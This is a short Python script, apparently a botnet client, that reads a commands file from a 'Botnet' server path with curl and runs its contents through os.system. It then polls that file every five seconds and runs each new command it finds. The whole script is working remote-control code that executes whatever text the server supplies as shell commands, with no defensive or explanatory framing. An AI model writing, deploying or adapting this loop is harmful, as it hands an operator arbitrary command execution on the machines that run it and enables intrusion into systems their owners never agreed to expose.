import os
import time
command=os.popen("curl localhost/Botnet/commands.txt").read()
os.system(command)
oldcommand=command
while 1==1:
    if oldcommand!=command:
        os.system(command)
        oldcommand=command
    else:
        print("Same command")
        time.sleep(5)
        command=os.popen("curl localhost/Botnet/commands.txt").read()
